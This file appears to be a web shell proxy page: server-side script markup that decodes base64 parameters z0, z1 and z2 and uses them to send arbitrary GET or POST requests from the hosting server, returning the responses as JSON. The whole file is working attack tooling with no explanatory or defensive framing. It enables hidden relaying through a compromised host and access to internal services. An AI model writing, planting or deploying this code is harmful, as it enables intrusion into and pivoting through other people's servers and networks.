<%
(function() {
    response.setContentType("application/json");
    response.setCharacterEncoding("UTF-8");

    function base64_decode(str) {
        if (!str) return "";
        try {
            var decoder = java.util.Base64.getDecoder();
            var decodedBytes = decoder.decode(str);
            return new java.lang.String(decodedBytes, "UTF-8");
        } catch (e) {
            return "";
        }
    }

    function send_http_request(urlStr, method, postData) {
        var result = { http_code: 0, body: "" };
        try {
            var url = new java.net.URL(urlStr);
            var conn = url.openConnection();
            
            conn.setRequestMethod(method);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setInstanceFollowRedirects(true); 

            if (method === "POST" && postData) {
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                
                var postBytes = new java.lang.String(postData).getBytes("UTF-8");
                conn.setRequestProperty("Content-Length", String(postBytes.length));
                
                var os = conn.getOutputStream();
                os.write(postBytes);
                os.flush();
                os.close();
            }

            result.http_code = conn.getResponseCode();

            var is = (result.http_code >= 200 && result.http_code < 400) ? conn.getInputStream() : conn.getErrorStream();
            if (is != null) {
                var reader = new java.io.BufferedReader(new java.io.InputStreamReader(is, "UTF-8"));
                var line;
                var responseBuffer = new java.lang.StringBuilder();
                while ((line = reader.readLine()) != null) {
                    responseBuffer.append(line).append("\n");
                }
                reader.close();
                result.body = responseBuffer.toString();
            }
        } catch (e) {
            result.body = e.toString();
        }
        return result;
    }

    var rawAction = request.getParameter("z0");
    var action = base64_decode(rawAction);

    var jsonResult = {
        "status": "error",
        "action": action,
        "http_code": null,
        "data": null
    };

    switch (action) {
        case "get":
            var url = base64_decode(request.getParameter("z1"));
            if (!url) {
                jsonResult.data = "Missing URL";
                break;
            }
            
            var res = send_http_request(url, "GET", null);
            jsonResult.status = "ok";
            jsonResult.http_code = res.http_code;
            jsonResult.data = res.body;
            break;

        case "post":
            var url = base64_decode(request.getParameter("z1"));
            var data = base64_decode(request.getParameter("z2"));
            if (!url) {
                jsonResult.data = "Missing URL";
                break;
            }

            var res = send_http_request(url, "POST", data);
            jsonResult.status = "ok";
            jsonResult.http_code = res.http_code;
            jsonResult.data = res.body;
            break;

        default:
            jsonResult.data = "Invalid action";
            break;
    }

    var jsonString = JSON.stringify(jsonResult);
    if (typeof echo === 'function') {
        echo(jsonString);
    } else {
        out.print(jsonString);
    }
})();
%>